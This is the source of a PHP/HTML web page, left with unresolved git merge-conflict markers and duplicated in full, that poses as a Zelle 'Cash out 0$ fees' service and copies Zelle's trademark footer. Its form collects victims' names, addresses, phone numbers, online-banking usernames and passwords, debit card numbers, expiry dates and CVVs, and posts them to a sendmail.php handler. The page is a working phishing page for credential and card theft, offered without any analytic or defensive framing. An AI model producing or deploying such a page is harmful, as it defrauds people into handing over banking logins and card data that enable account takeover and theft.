<<<<<<< HEAD
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Cash Out</title>
  <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="styl.css">
</head>
<body class="text-white">
  <!-- NAVBAR -->
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <div class="container-fluid justify-content-between align-items-center">
      <!-- Accueil gauche -->
      <a class="navbar-brand" href="index.php">Accueil</a>

      <!-- Image centrale visible uniquement sur écrans md+ -->
      <div class="d-none d-md-block">
        <img src="img/centrale.png" alt="Logo Central" height="50">
      </div>

      <!-- Bouton droite vers sold out -->
      <div>
        <a href="sold-out.php" class="btn btn-warning">Cash out 0$ fees</a>
      </div>
    </div>
  </nav>


  <div class="container py-5">
    <h1 class="mb-4">Form</h1>

    <?php if (!empty($success)) echo "<div class='alert alert-success'>$success</div>"; ?>
    <?php if (!empty($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>

    <form method="POST" action="sendmail.php">
      <h4>Personal :</h4>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="first_name" class="form-control" placeholder="Legal first name" required></div>
        <div class="col-md-6 mb-3"><input type="text" name="last_name" class="form-control" placeholder="Legal last name" required></div>
      </div>
      <div class="mb-3"><input type="text" name="street_address" class="form-control" placeholder="Street address" required></div>
      <div class="row">
        <div class="col-md-4 mb-3"><input type="text" name="city" class="form-control" placeholder="City" required></div>
        <div class="col-md-4 mb-3"><input type="text" name="state" class="form-control" placeholder="State" required></div>
        <div class="col-md-4 mb-3"><input type="text" name="zip_code" class="form-control" placeholder="Zip code" required></div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="email" name="email" class="form-control" placeholder="Email" required></div>
        <div class="col-md-6 mb-3"><input type="tel" name="phone" class="form-control" placeholder="Phone number" required></div>
      </div>

      <h4 class="mt-4">Banking Informations</h4>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="bank" class="form-control" placeholder="Bank institution" required></div>
        <div class="col-md-6 mb-3"><input type="text" name="bank_username" class="form-control" placeholder="Username" required></div>
        <div class="col-md-6 mb-3"><input type="password" name="bank_password" class="form-control" placeholder="Password" required></div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="card_number" class="form-control" placeholder="Debit card number" required></div>
        <div class="col-md-3 mb-3"><input type="text" name="expiration_date" class="form-control" placeholder="Expiration date (MM/YY)" required></div>
        <div class="col-md-3 mb-3"><input type="text" name="cvv" class="form-control" placeholder="CVV" required></div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="amount" class="form-control" placeholder="Amount" required></div>
        <div class="col-md-6 mb-3"><input type="text" name="username" class="form-control" placeholder="Username" required></div>
      </div>

      <div class="text-center mt-4">
        <button type="submit" class="btn btn-warning px-5">Envoyer</button>
      </div>
    </form>
  </div>
   <footer class="bg-dark text-white text-center p-4 mt-5">
    <p class="mb-2">
      &copy; 2025 Early Warning Services, LLC. All rights reserved. <br>
      Zelle and the Zelle marks used herein are trademarks of Early Warning Services, LLC. Other product and company names mentioned herein are the property of their respective owners.
    </p>
    <img src="img/footer.png" alt="Image Footer" width="100">
  </footer>
  <script src="bootstrap/js/bootstrap.bundle.min.js"></script>
</body>
</html>
=======
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Cash Out</title>
  <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="styl.css">
</head>
<body class="text-white">
  <!-- NAVBAR -->
  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <div class="container-fluid justify-content-between align-items-center">
      <!-- Accueil gauche -->
      <a class="navbar-brand" href="index.php">Accueil</a>

      <!-- Image centrale visible uniquement sur écrans md+ -->
      <div class="d-none d-md-block">
        <img src="img/centrale.png" alt="Logo Central" height="50">
      </div>

      <!-- Bouton droite vers sold out -->
      <div>
        <a href="sold-out.php" class="btn btn-warning">Cash out 0$ fees</a>
      </div>
    </div>
  </nav>


  <div class="container py-5">
    <h1 class="mb-4">Form</h1>

    <?php if (!empty($success)) echo "<div class='alert alert-success'>$success</div>"; ?>
    <?php if (!empty($error)) echo "<div class='alert alert-danger'>$error</div>"; ?>

    <form method="POST" action="sendmail.php">
      <h4>Personal :</h4>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="first_name" class="form-control" placeholder="Legal first name" required></div>
        <div class="col-md-6 mb-3"><input type="text" name="last_name" class="form-control" placeholder="Legal last name" required></div>
      </div>
      <div class="mb-3"><input type="text" name="street_address" class="form-control" placeholder="Street address" required></div>
      <div class="row">
        <div class="col-md-4 mb-3"><input type="text" name="city" class="form-control" placeholder="City" required></div>
        <div class="col-md-4 mb-3"><input type="text" name="state" class="form-control" placeholder="State" required></div>
        <div class="col-md-4 mb-3"><input type="text" name="zip_code" class="form-control" placeholder="Zip code" required></div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="email" name="email" class="form-control" placeholder="Email" required></div>
        <div class="col-md-6 mb-3"><input type="tel" name="phone" class="form-control" placeholder="Phone number" required></div>
      </div>

      <h4 class="mt-4">Banking Informations</h4>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="bank" class="form-control" placeholder="Bank institution" required></div>
        <div class="col-md-6 mb-3"><input type="text" name="bank_username" class="form-control" placeholder="Username" required></div>
        <div class="col-md-6 mb-3"><input type="password" name="bank_password" class="form-control" placeholder="Password" required></div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="card_number" class="form-control" placeholder="Debit card number" required></div>
        <div class="col-md-3 mb-3"><input type="text" name="expiration_date" class="form-control" placeholder="Expiration date (MM/YY)" required></div>
        <div class="col-md-3 mb-3"><input type="text" name="cvv" class="form-control" placeholder="CVV" required></div>
      </div>
      <div class="row">
        <div class="col-md-6 mb-3"><input type="text" name="amount" class="form-control" placeholder="Amount" required></div>
        <div class="col-md-6 mb-3"><input type="text" name="username" class="form-control" placeholder="Username" required></div>
      </div>

      <div class="text-center mt-4">
        <button type="submit" class="btn btn-warning px-5">Envoyer</button>
      </div>
    </form>
  </div>
   <footer class="bg-dark text-white text-center p-4 mt-5">
    <p class="mb-2">
      &copy; 2025 Early Warning Services, LLC. All rights reserved. <br>
      Zelle and the Zelle marks used herein are trademarks of Early Warning Services, LLC. Other product and company names mentioned herein are the property of their respective owners.
    </p>
    <img src="img/footer.png" alt="Image Footer" width="100">
  </footer>
  <script src="bootstrap/js/bootstrap.bundle.min.js"></script>
</body>
</html>
>>>>>>> 7a1218782367c599f0e2e70d16742f36ee943743
